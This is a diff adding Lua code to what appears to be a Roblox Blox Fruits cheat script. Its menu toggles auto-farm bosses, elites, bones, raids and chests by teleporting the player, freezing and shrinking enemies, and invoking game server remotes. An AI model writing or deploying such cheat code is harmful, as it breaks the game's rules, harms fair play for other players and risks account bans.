+                 "Magma Admiral", "Fishman Lord", "Wysper", "Thunder God", "Cyborg", "Saber Expert"};
+elseif World2 then
+    tableBoss = {"Diamond", "Jeremy", "Fajita", "Don Swan", "Smoke Admiral", "Cursed Captain", "Darkbeard", "Order",
+                 "Awakened Ice Admiral", "Tide Keeper"};
+elseif World3 then
+    tableBoss = {"Stone", "Island Empress", "Kilo Admiral", "Captain Elephant", "Beautiful Pirate",
+                 "rip_indra True Form", "Longma", "Soul Reaper", "Cake Queen"};
+end
+ChooseBossDropdown = Tabs.MainTab:Dropdown({
+    Title = "Choose Boss",
+    Values = tableBoss,
+    Value = _G.Settings.Main["Selected Boss"],
+    Callback = function(option)
+        _G.Settings.Main["Selected Boss"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmBossToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Farm Boss",
+    Desc = "Auto Kill Boss When Spawn",
+    Value = _G.Settings.Main["Auto Farm Boss"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm Boss"] = state;
+        StopTween(_G.Settings.Main["Auto Farm Boss"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Auto Farm Boss"] then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild(_G.Settings.Main["Selected Boss"]) then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == _G.Settings.Main["Selected Boss"] then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Main["Auto Farm Boss"] or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                elseif (game:GetService("ReplicatedStorage")):FindFirstChild(_G.Settings.Main["Selected Boss"]) then
+                    TweenPlayer(
+                        ((game:GetService("ReplicatedStorage")):FindFirstChild(_G.Settings.Main["Selected Boss"])).HumanoidRootPart
+                            .CFrame * CFrame.new(5, 10, 2));
+                end
+            end);
+        end
+    end
+end);
+AutoFarmAllBossToggle = Tabs.MainTab:Toggle({
+    Title = "Auto Farm All Boss",
+    Value = _G.Settings.Main["Auto Farm All Boss"],
+    Callback = function(state)
+        _G.Settings.Main["Auto Farm All Boss"] = state;
+        StopTween(_G.Settings.Main["Auto Farm All Boss"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Main["Auto Farm All Boss"] then
+            pcall(function()
+                for i, boss in pairs(tableBoss) do
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild(boss) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == boss then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        v.Humanoid.WalkSpeed = 0;
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        Attack();
+                                    until not _G.Settings.Main["Auto Farm All Boss"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    elseif (game:GetService("ReplicatedStorage")):FindFirstChild(boss) then
+                        TweenPlayer(((game:GetService("ReplicatedStorage")):FindFirstChild(boss)).HumanoidRootPart
+                                        .CFrame * CFrame.new(5, 10, 2));
+                    end
+                end
+            end);
+        end
+    end
+end);
+EliteHunterSection = Tabs.OthersTab:Section({
+    Title = "Elite Hunter",
+    TextXAlignment = "Left"
+});
+EliteHunterParagraph = Tabs.OthersTab:Paragraph({
+    Title = "Elite Hunter Status",
+    Desc = "N/A"
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if (game:GetService("ReplicatedStorage")):FindFirstChild("Diablo") or
+                (game:GetService("ReplicatedStorage")):FindFirstChild("Deandre") or
+                (game:GetService("ReplicatedStorage")):FindFirstChild("Urban") or
+                (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or
+                (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre") or
+                (game:GetService("Workspace")).Enemies:FindFirstChild("Urban") then
+                EliteHunterParagraph:SetDesc("Spawn!");
+            else
+                EliteHunterParagraph:SetDesc("Not Spawn");
+            end
+        end);
+    end
+end);
+EliteHunterProgressParagraph = Tabs.OthersTab:Paragraph({
+    Title = "Elite Hunter Progress",
+    Desc = "N/A"
+});
+spawn(function()
+    while wait() do
+        pcall(function()
+            if World1 or World2 then
+                EliteHunterProgressParagraph:SetDesc("Sea 3 Only");
+            elseif World3 then
+                EliteHunterProgressParagraph:SetDesc((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(
+                    "EliteHunter", "Progress"));
+            end
+        end);
+    end
+end);
+AutoEliteHunterToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Elite Hunter",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Elite Hunter"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Elite Hunter"] = state;
+        StopTween(_G.Settings.Farm["Auto Elite Hunter"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoEliteHunterHopToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Elite Hunter Hop",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Elite Hunter Hop"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Elite Hunter Hop"] = state;
+        StopTween(_G.Settings.Farm["Auto Elite Hunter Hop"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Elite Hunter"] and World3 then
+            pcall(function()
+                local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text;
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Urban") then
+                    if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                        TweenPlayer(CFrame.new(-5418.892578125, 313.74130249023, -2826.2260742188));
+                        if (Vector3.new((-5418.892578125), 313.74130249023, (-2826.2260742188)) -
+                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter");
+                        end
+                    elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                        if string.find(QuestTitle, "Diablo") or string.find(QuestTitle, "Deandre") or
+                            string.find(QuestTitle, "Urban") then
+                            if (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") or
+                                (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre") or
+                                (game:GetService("Workspace")).Enemies:FindFirstChild("Urban") then
+                                for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                                    if v.Name == "Diablo" or v.Name == "Deandre" or v.Name == "Urban" then
+                                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                            v.Humanoid.Health > 0 then
+                                            repeat
+                                                (game:GetService("RunService")).Heartbeat:wait();
+                                                AutoHaki();
+                                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                                v.Humanoid.WalkSpeed = 0;
+                                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                                Attack();
+                                            until _G.Settings.Farm["Auto Elite Hunter"] == false or v.Humanoid.Health <=
+                                                0 or (not v.Parent);
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Elite Hunter Hop"] and World3 then
+            pcall(function()
+                if _G.Settings.Farm["Auto Elite Hunter"] then
+                    if not (game:GetService("Workspace")).Enemies:FindFirstChild("Diablo") and
+                        (not (game:GetService("Workspace")).Enemies:FindFirstChild("Deandre")) and
+                        (not (game:GetService("Workspace")).Enemies:FindFirstChild("Urban")) then
+                        Hop();
+                    end
+                end
+            end);
+        end
+    end
+end);
+BoneFarmSection = Tabs.OthersTab:Section({
+    Title = "Bone Farm",
+    TextXAlignment = "Left"
+});
+local listBoneFarmMethod = {"Quest", "No Quest"};
+BoneFarmMethodDropdown = Tabs.OthersTab:Dropdown({
+    Title = "Choose Bone Farm Method",
+    Values = listBoneFarmMethod,
+    Value = _G.Settings.Farm["Selected Bone Farm Method"],
+    Callback = function(option)
+        _G.Settings.Farm["Selected Bone Farm Method"] = option;
+        (getgenv()).SaveSetting();
+    end
+});
+BoneCountParagraph = Tabs.OthersTab:Paragraph({
+    Title = "Bones Owned",
+    Desc = "N/A"
+});
+spawn(function()
+    while wait() do
+        pcall(function()
+            local Bones = GetCountMaterials("Bones");
+            BoneCountParagraph:SetDesc(tostring(Bones));
+        end);
+    end
+end);
+AutoFarmBoneToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Farm Bone",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Farm Bone"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Farm Bone"] = state;
+        StopTween(_G.Settings.Farm["Auto Farm Bone"]);
+        (getgenv()).SaveSetting();
+    end
+});
+BonePos = CFrame.new(-9506.234375, 172.130615234375, 6117.0771484375);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Selected Bone Farm Method"] == "No Quest" and _G.Settings.Farm["Auto Farm Bone"] and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or
+                            v.Name == "Posessed Mummy" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Farm["Auto Farm Bone"] or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-9506.234375, 172.130615234375, 6117.0771484375));
+                end
+            end);
+        end
+    end
+end);
+BoneQuestPos = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Selected Bone Farm Method"] == "Quest" and _G.Settings.Farm["Auto Farm Bone"] and World3 then
+            pcall(function()
+                local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle
+                                       .Title.Text;
+                if not string.find(QuestTitle, "Demonic Soul") then
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+                end
+                if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+                    TweenPlayer(BoneQuestPos);
+                    if (BoneQuestPos.Position -
+                        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest",
+                            "HauntedQuest2", 1);
+                    end
+                elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild("Reborn Skeleton") or
+                        (game:GetService("Workspace")).Enemies:FindFirstChild("Living Zombie") or
+                        (game:GetService("Workspace")).Enemies:FindFirstChild("Demonic Soul") or
+                        (game:GetService("Workspace")).Enemies:FindFirstChild("Posessed Mummy") then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and
+                                v.Humanoid.Health > 0 then
+                                if v.Name == "Reborn Skeleton" or v.Name == "Living Zombie" or v.Name == "Demonic Soul" or
+                                    v.Name == "Posessed Mummy" then
+                                    if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest
+                                                       .Container.QuestTitle.Title.Text, "Demonic Soul") then
+                                        repeat
+                                            (game:GetService("RunService")).Heartbeat:wait();
+                                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                            AutoHaki();
+                                            PosMon = v.HumanoidRootPart.CFrame;
+                                            MonFarm = v.Name;
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                            v.Humanoid.WalkSpeed = 0;
+                                            Attack();
+                                        until not _G.Settings.Farm["Auto Farm Bone"] or v.Humanoid.Health <= 0 or
+                                            (not v.Parent) or
+                                            (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible ==
+                                            false;
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+AutoRandomSurpriseToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Random Surprise",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Random Surprise"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Random Surprise"] = state;
+        StopTween(_G.Settings.Farm["Auto Random Surprise"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Farm["Auto Random Surprise"] then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1);
+            end
+        end
+    end);
+end);
+PirateRaidSection = Tabs.OthersTab:Section({
+    Title = "Pirate Raid",
+    TextXAlignment = "Left"
+});
+AutoPirateRaidToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Pirate Raid",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Pirate Raid"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Pirate Raid"] = state;
+        StopTween(_G.Settings.Farm["Auto Pirate Raid"]);
+        (getgenv()).SaveSetting();
+    end
+});
+function getPirateRaidEnemies()
+    local PirateRaidPos = CFrame.new(-5515.08301, 343.112762, -3013.25171, 0.0679906458, 0.0000000121971047,
+        -0.997685969, -0.0000000640159001, 1, 0.00000000786281706, 0.997685969, 0.000000063333168, 0.0679906458);
+    for _, v in pairs(game.Workspace.Enemies:GetChildren()) do
+        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+            local enemyPos = v.HumanoidRootPart.Position;
+            if (PirateRaidPos.Position - enemyPos).Magnitude <= 2000 then
+                if v then
+                    return v;
+                else
+                    return false;
+                end
+            end
+        end
+    end
+end
+spawn(function()
+    while wait() do
+        if _G.Settings.Farm["Auto Pirate Raid"] then
+            pcall(function()
+                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                    if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+                        if v.Name then
+                            if getPirateRaidEnemies() then
+                                if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                                    (v:FindFirstChild("HumanoidRootPart")).Position).Magnitude <= 2000 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        Attack();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        v.HumanoidRootPart.Transparency = 1;
+                                        v.Humanoid.JumpPower = 0;
+                                        v.Humanoid.WalkSpeed = 0;
+                                        PosMon = v.HumanoidRootPart.CFrame;
+                                        MonFarm = v.Name;
+                                    until not _G.Settings.Main["Auto Pirate Raid"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0 or (not game.Workspace.Enemies:FindFirstChild(v.Name));
+                                end
+                            else
+                                TweenPlayer(CFrame.new(-5515.08301, 343.112762, -3013.25171, 0.0679906458,
+                                    0.0000000121971047, -0.997685969, -0.0000000640159001, 1, 0.00000000786281706,
+                                    0.997685969, 0.000000063333168, 0.0679906458));
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+ChestFarmSection = Tabs.OthersTab:Section({
+    Title = "Chest Farm",
+    TextXAlignment = "Left"
+});
+AutoFarmChestTweenToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Farm Chest Tween",
+    Desc = "Tween to chest",
+    Value = _G.Settings.Farm["Auto Farm Chest Tween"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Farm Chest Tween"] = state;
+        StopTween(_G.Settings.Farm["Auto Farm Chest Tween"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmChestInstantToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Farm Chest Instant",
+    Desc = "Instant to chest",
+    Value = _G.Settings.Farm["Auto Farm Chest Instant"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Farm Chest Instant"] = state;
+        StopTween(_G.Settings.Farm["Auto Farm Chest Instant"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoStopItemsToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Stop Items",
+    Desc = "Stop When Get God's Chalice or FoD",
+    Value = _G.Settings.Farm["Auto Stop Items"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Stop Items"] = state;
+        StopTween(_G.Settings.Farm["Auto Stop Items"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait() do
+        pcall(function()
+            if _G.Settings.Farm["Auto Stop Items"] then
+                if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("God's Chalice") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("God's Chalice") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Fist of Darkness") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fist of Darkness") then
+                    AutoFarmChestInstantToggle:SetValue(false);
+                    AutoFarmChestTweenToggle:SetValue(false);
+                    TweenPlayer((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Farm["Auto Farm Chest Tween"] then
+                for i, v in pairs((game:GetService("Workspace")).ChestModels:GetChildren()) do
+                    if v.Name:find("Chest") then
+                        repeat
+                            wait();
+                            TweenPlayer(v.RootPart.CFrame);
+                        until _G.Settings.Farm["Auto Farm Chest Tween"] == false or (not v.Parent);
+                        TweenPlayer((game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame);
+                    end
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Farm["Auto Farm Chest Instant"] then
+                for i, v in pairs((game:GetService("Workspace")).ChestModels:GetChildren()) do
+                    if v.Name:find("Chest") then
+                        repeat
+                            wait();
+                            if v.Name == "DiamondChest" then
+                                InstantTp(v.RootPart.CFrame);
+                            elseif v.Name == "GoldChest" then
+                                InstantTp(v.RootPart.CFrame);
+                            elseif v.Name == "SilverChest" then
+                                InstantTp(v.RootPart.CFrame);
+                            end
+                        until not _G.Settings.Farm["Auto Farm Chest Instant"] or (not v.Parent);
+                    end
+                end
+            end
+        end);
+    end
+end);
+CakePrinceSection = Tabs.OthersTab:Section({
+    Title = "Cake Prince",
+    TextXAlignment = "Left"
+});
+CakePrinceStatusParagraph = Tabs.OthersTab:Paragraph({
+    Title = "Cake Prince Status",
+    Desc = "N/A"
+});
+spawn(function()
+    while task.wait(5) do
+        pcall(function()
+            if World3 then
+                if string.len((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner")) ==
+                    88 then
+                    CakePrinceStatusParagraph:SetDesc(string.sub(
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner"), 39, 41) ..
+                                                          " Remaining");
+                elseif string.len(
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 87 then
+                    CakePrinceStatusParagraph:SetDesc(string.sub(
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner"), 39, 40) ..
+                                                          " Remaining");
+                elseif string.len(
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 86 then
+                    CakePrinceStatusParagraph:SetDesc(string.sub(
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner"), 39, 39) ..
+                                                          " Remaining");
+                else
+                    CakePrinceStatusParagraph:SetDesc("Cake Prince Status: Spawned!");
+                end
+            else
+                CakePrinceStatusParagraph:SetDesc("Sea 3 only");
+            end
+        end);
+    end
+end);
+AutoKatakuriToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Katakuri",
+    Desc = "Auto Farm + Kill Cake Prince [ Sea 3 Only ]",
+    Value = _G.Settings.Farm["Auto Farm Katakuri"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Farm Katakuri"] = state;
+        StopTween(_G.Settings.Farm["Auto Farm Katakuri"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoSpawnCakePrinceToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Spawn Cake Prince",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Spawn Cake Prince"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Spawn Cake Prince"] = state;
+        StopTween(_G.Settings.Farm["Auto Spawn Cake Prince"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Spawn Cake Prince"] and World3 then
+            wait(2);
+            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CakePrinceSpawner", true);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Farm Katakuri"] and World3 then
+            pcall(function()
+                if game.ReplicatedStorage:FindFirstChild("Cake Prince") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Prince") then
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Prince") then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == "Cake Prince" then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        v.Humanoid.WalkSpeed = 0;
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        RemoveAnimation(v);
+                                        Attack();
+                                    until not _G.Settings.Farm["Auto Farm Katakuri"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    elseif (game:GetService("Workspace")).Map.CakeLoaf.BigMirror.Other.Transparency == 0 and
+                        ((CFrame.new((-1990.672607421875), 4532.99951171875, (-14973.6748046875))).Position -
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 2000 then
+                        TweenPlayer(CFrame.new(-2151.82153, 149.315704, -12404.9053));
+                    end
+                elseif (game:GetService("Workspace")).Enemies:FindFirstChild("Cookie Crafter") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Guard") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Baking Staff") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Head Baker") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name ==
+                            "Head Baker" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.Farm["Auto Farm Katakuri"] or (not v.Parent) or v.Humanoid.Health <=
+                                    0 or (game:GetService("Workspace")).Map.CakeLoaf.BigMirror.Other.Transparency == 0 or
+                                    (game:GetService("ReplicatedStorage")):FindFirstChild(
+                                        "Cake Prince [Lv. 2300] [Raid Boss]") or
+                                    (game:GetService("Workspace")).Enemies:FindFirstChild(
+                                        "Cake Prince [Lv. 2300] [Raid Boss]");
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                    TweenPlayer(CFrame.new(-2091.911865234375, 70.00884246826172, -12142.8359375));
+                end
+            end);
+        end
+    end
+end);
+AutoKillCakePrinceToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Kill Cake Prince",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Kill Cake Prince"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Kill Cake Prince"] = state;
+        StopTween(_G.Settings.Farm["Auto Kill Cake Prince"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoKillDoughKingToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Kill Dough King",
+    Desc = "Function Sea 3 Only",
+    Value = _G.Settings.Farm["Auto Kill Dough King"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Kill Dough King"] = state;
+        StopTween(_G.Settings.Farm["Auto Kill Dough King"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Kill Cake Prince"] and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Prince") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cake Prince" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    RemoveAnimation(v);
+                                    Attack();
+                                    if v.Humanoid:FindFirstChild("Animator") then
+                                        v.Humanoid.Animator:Destroy();
+                                    end
+                                until not _G.Settings.Farm["Auto Kill Cake Prince"] or (not v.Parent) or
+                                    v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                else
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Kill Dough King"] and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Dough King") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Dough King" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    RemoveAnimation(v);
+                                    Attack();
+                                    if v.Humanoid:FindFirstChild("Animator") then
+                                        v.Humanoid.Animator:Destroy();
+                                    end
+                                until not _G.Settings.Farm["Auto Kill Dough King"] or (not v.Parent) or
+                                    v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+MaterialsSection = Tabs.OthersTab:Section({
+    Title = "Materials",
+    TextXAlignment = "Left"
+});
+if World1 then
+    MaterialList = {"Magma Ore", "Angel Wings", "Leather", "Scrap Metal"};
